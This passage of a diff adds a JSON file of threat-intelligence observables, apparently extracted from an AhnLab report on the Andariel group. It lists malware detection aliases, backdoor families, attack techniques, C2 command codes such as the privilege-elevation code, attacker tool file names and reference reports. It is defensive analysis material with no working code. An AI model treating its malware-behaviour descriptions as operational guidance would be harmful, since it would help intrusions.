+                "notes": "Malware reportedly produced by the Andariel group that destroys hard disk contents after August each year."
+            },
+            {
+                "observable_value": "V3, AhnLab's anti-malware product",
+                "artifact_details": "Described",
+                "data_source": "system logs, anti-malware reports",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Software",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Product referenced as detecting malware related to the Andariel group. No additional distinguishing details (e.g., version or unique identifiers) are provided."
+            },
+            {
+                "observable_value": "Trojan/Win32.Phandoor (2016.01.13.00)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "Trojan/Win32.Andaratm (2018.05.03.00)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "W97M/Downloader (2017.11.03.00)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "Backdoor/Win32.Aryan (2015.12.23.00)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "Dropper/Win32.Fakeinstaller (2017.01.02.09)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "Trojan/Win32.HackTool (2017.06.27.03)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "Trojan/Win32.Andarat (2017.10.27.03)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "HackTool/Win32.Malsender (2017.04.17.04)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "Trojan/Win32.Rifdoor (2015.12.23.04)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "X97M/Downloader (2015.12.24.05)",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Alias provided by AhnLab V3."
+            },
+            {
+                "observable_value": "aqent installed in the client",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Software",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Refers to a client-side agent whose vulnerability was exploited; no specific version or vendor is mentioned."
+            },
+            {
+                "observable_value": "port number used by the central management solution",
+                "artifact_details": "Described",
+                "data_source": "network logs",
+                "classification": "Network Port",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Indicates that monitoring should include scans on the designated port for the management solution, although the specific port number is not provided."
+            },
+            {
+                "observable_value": "upload/asecissue files/ASEC REPORT vol.89.pdf",
+                "artifact_details": "Described",
+                "data_source": "document references",
+                "classification": "File Path/Document",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "File path included as part of the reference"
+            }
+        ],
+        "Mentioned": [
+            {
+                "observable_value": "Andariel Threat Group",
+                "artifact_details": "Mentioned",
+                "data_source": "CTI report",
+                "classification": "Threat Actor",
+                "STIX_supported": "Full: Threat Actor",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Reference to a threat actor group targeting attacks."
+            },
+            {
+                "observable_value": "Lazarus",
+                "artifact_details": "Mentioned",
+                "data_source": "CTI report",
+                "classification": "Threat Actor",
+                "STIX_supported": "Full: Threat Actor",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Parent threat group to Andariel Threat Group."
+            },
+            {
+                "observable_value": "AhnLab, Inc.",
+                "artifact_details": "Mentioned",
+                "data_source": "CTI report",
+                "classification": "Organization Name",
+                "STIX_supported": "Full: Identity",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Company that owns the website and contact information."
+            },
+            {
+                "observable_value": "Spear Phishing",
+                "artifact_details": "Mentioned",
+                "data_source": "Email logs",
+                "classification": "Attack Technique",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Common phishing vector targeting specific individuals."
+            },
+            {
+                "observable_value": "Watering Hole (Active-X Vulnerability)",
+                "artifact_details": "Mentioned",
+                "data_source": "Web proxy logs / Network traffic logs",
+                "classification": "Attack Technique",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Technique exploiting Active-X vulnerabilities through compromised websites."
+            },
+            {
+                "observable_value": "Central Manaqement Solution",
+                "artifact_details": "Mentioned",
+                "data_source": "IT system inventory or management logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Listed without further details; likely a product used in IT management."
+            },
+            {
+                "observable_value": "Supply Chain Attack",
+                "artifact_details": "Mentioned",
+                "data_source": "Various logs (e.g., supply chain network logs, vendor reports)",
+                "classification": "Attack Technique",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Represents compromise through third-party software or hardware."
+            },
+            {
+                "observable_value": "Malware \u2013 Backdoor",
+                "artifact_details": "Mentioned",
+                "data_source": "Malware analysis reports",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Generic reference to a backdoor malware component."
+            },
+            {
+                "observable_value": "Andariel group",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Threat Actor",
+                "STIX_supported": "Full: Threat Actor",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Subgroup of the Lazarus group active since 2015."
+            },
+            {
+                "observable_value": "Lazarus group",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Threat Actor",
+                "STIX_supported": "Full: Threat Actor",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Parent threat actor group related to Andariel group."
+            },
+            {
+                "observable_value": "Aryan",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Malware/Backdoor",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Well-known backdoor used by the group."
+            },
+            {
+                "observable_value": "Gh0st RAT",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Malware/Remote Access Trojan",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Popular remote access tool referenced as a backdoor."
+            },
+            {
+                "observable_value": "Andarat",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Malware/Backdoor",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Self-developed backdoor by the Andariel group."
+            },
+            {
+                "observable_value": "Andaratm",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Malware/Backdoor",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Self-developed backdoor by the Andariel group."
+            },
+            {
+                "observable_value": "Rifdoor",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Malware/Backdoor",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Self-developed backdoor used by the group."
+            },
+            {
+                "observable_value": "Phandoor",
+                "artifact_details": "Mentioned",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Malware/Backdoor",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Self-developed backdoor used by the group."
+            },
+            {
+                "observable_value": "vulnerabilities of local software in South Korea",
+                "artifact_details": "Mentioned",
+                "data_source": "CTI report text",
+                "classification": "Software Vulnerability",
+                "STIX_supported": "Full: Vulnerability",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Generic reference to software vulnerabilities targeting local software in South Korea without specific details."
+            },
+            {
+                "observable_value": "'MZ' ASCII string",
+                "artifact_details": "Mentioned",
+                "data_source": "file content analysis",
+                "classification": "File Header Signature",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "pefile",
+                "notes": "The 'MZ' header, normally indicating a Windows executable, is artificially added by the malware to aid in evading behavior-based detection."
+            },
+            {
+                "observable_value": "Internet Explorer browser",
+                "artifact_details": "Mentioned",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Software",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "The vulnerable browser used to access the compromised website during the watering hole attack."
+            },
+            {
+                "observable_value": "specific IP address ranges",
+                "artifact_details": "Mentioned",
+                "data_source": "network logs",
+                "classification": "Network Entity",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "The attack limits infection to such ranges, though no specific addresses are provided."
+            },
+            {
+                "observable_value": "specified target IP address",
+                "artifact_details": "Mentioned",
+                "data_source": "network logs",
+                "classification": "IP Address",
+                "STIX_supported": "Full: IPv4 Address",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "The text refers generically to a target IP address that the attack was designed to infect, without providing a specific value."
+            },
+            {
+                "observable_value": "official website (for software distribution)",
+                "artifact_details": "Mentioned",
+                "data_source": "network logs, web logs",
+                "classification": "Domain Name",
+                "STIX_supported": "Full: Domain Name",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Referenced as the distribution point for the infected software, though no specific URL or domain is provided."
+            },
+            {
+                "observable_value": "Anti-virus management programs",
+                "artifact_details": "Mentioned",
+                "data_source": "System logs, security software logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Referenced generically as a target where vulnerabilities were exploited."
+            },
+            {
+                "observable_value": "Internet cafe management program",
+                "artifact_details": "Mentioned",
+                "data_source": "System logs, software inventories",
+                "classification": "Software/Tool",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Used as a channel to distribute malware to multiple computers."
+            },
+            {
+                "observable_value": "Monetary unions website",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs, web server logs",
+                "classification": "Website",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Website used to deliver malware via download of a malicious installation file."
+            },
+            {
+                "observable_value": "Macro-based emails",
+                "artifact_details": "Mentioned",
+                "data_source": "Email logs",
+                "classification": "Email Message",
+                "STIX_supported": "Full: Email Message",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Emails containing macros used to impersonate a National Assembly member\u2019s office."
+            },
+            {
+                "observable_value": "Aryan",
+                "artifact_details": "Mentioned",
+                "data_source": "threat intelligence report",
+                "classification": "Malware Family",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Name of the malware associated with the reported artifact."
+            },
+            {
+                "observable_value": "log.txt",
+                "artifact_details": "Mentioned",
+                "data_source": "file system logs",
+                "classification": "Filename",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Generic log file name extracted from the hex dump."
+            },
+            {
+                "observable_value": "Themida",
+                "artifact_details": "Mentioned",
+                "data_source": "CTI report",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Software",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Packager used to package some variants of Gh0st RAT."
+            },
+            {
+                "observable_value": "cmd.exe",
+                "artifact_details": "Mentioned",
+                "data_source": "process execution logs",
+                "classification": "Executable File/Command",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Default command executed by the malware when no specific command is provided."
+            },
+            {
+                "observable_value": "0x9",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Represents the command for Drive information."
+            },
+            {
+                "observable_value": "0xA",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Represents the command for File search."
+            },
+            {
+                "observable_value": "0xB",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Represents the command for receiving data online for file creation."
+            },
+            {
+                "observable_value": "0x10",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command to re-execute the main function after a set period."
+            },
+            {
+                "observable_value": "0x12",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command to relocate the nehomegpa.dll file."
+            },
+            {
+                "observable_value": "0x19",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command to get the process list."
+            },
+            {
+                "observable_value": "0x1A",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command to end a process."
+            },
+            {
+                "observable_value": "0x1B",
+                "artifact_details": "Mentioned",
+                "data_source": "Network logs (C&C communications)",
+                "classification": "Command code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command to elevate privileges."
+            },
+            {
+                "observable_value": "cmd.exe",
+                "artifact_details": "Mentioned",
+                "data_source": "System logs / file system",
+                "classification": "Executable",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Referenced as the executable file that Phandoor instructs to run."
+            },
+            {
+                "observable_value": "designated C2 server",
+                "artifact_details": "Mentioned",
+                "data_source": "Network Traffic / Threat Intelligence",
+                "classification": "Network Entity",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Generic reference to a command and control server that the malware attempts to connect to."
+            },
+            {
+                "observable_value": "socket",
+                "artifact_details": "Mentioned",
+                "data_source": "Malware Code Analysis",
+                "classification": "Network Communication Keyword",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Common networking term extracted from the disassembled malware hex dump."
+            },
+            {
+                "observable_value": "Andaratm",
+                "artifact_details": "Mentioned",
+                "data_source": "malware analysis reports",
+                "classification": "Malware Family",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Referenced in relation to its encryption method and execution of simple commands."
+            },
+            {
+                "observable_value": "Putty Link",
+                "artifact_details": "Mentioned",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Tool",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Referenced as one of the various tools used by the attacker."
+            },
+            {
+                "observable_value": "pcon.exe",
+                "artifact_details": "Mentioned",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Listed among file names used to check IP and port."
+            },
+            {
+                "observable_value": "portc.exe",
+                "artifact_details": "Mentioned",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Listed among file names used to check IP and port."
+            },
+            {
+                "observable_value": "central management solution",
+                "artifact_details": "Mentioned",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Software",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Refers generically to a solution used by companies and institutions that, if compromised, can lead to extensive organizational damage."
+            },
+            {
+                "observable_value": "management server",
+                "artifact_details": "Mentioned",
+                "data_source": "system logs",
+                "classification": "Server",
+                "STIX_supported": "Full: Host",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "The server component of the central management solution whose security is critical."
+            },
+            {
+                "observable_value": "AhnLab Reveals the Secret of Operation Black Mine",
+                "artifact_details": "Mentioned",
+                "data_source": "document references",
+                "classification": "Reference Report",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Reference title mentioned in the report"
+            },
+            {
+                "observable_value": "Reasons Behind the Continued Attacks on Defense Industries  dist=2&seq=26565",
+                "artifact_details": "Mentioned",
+                "data_source": "document references",
+                "classification": "Reference Report",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Includes query parameters as part of reference identifier"
+            },
+            {
+                "observable_value": "Financial Security Institute Intelligence Report_Threat Group Profiling that Targets Korea",
+                "artifact_details": "Mentioned",
+                "data_source": "document references",
+                "classification": "Reference Report",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Reference title provided in the document"
+            },
+            {
+                "observable_value": "Series of breaches of renowned companies, Daring Hack Attacks - Part 1",
+                "artifact_details": "Mentioned",
+                "data_source": "document references",
+                "classification": "Reference Report",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Appears twice but captured as one unique observable"
+            },
+            {
+                "observable_value": "Hana Tour's Customer Records Leaked... All Started from Their Vendor",
+                "artifact_details": "Mentioned",
+                "data_source": "document references",
+                "classification": "Reference Report",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Reference title indicating a security incident"
+            }
+        ]
+    }
+}
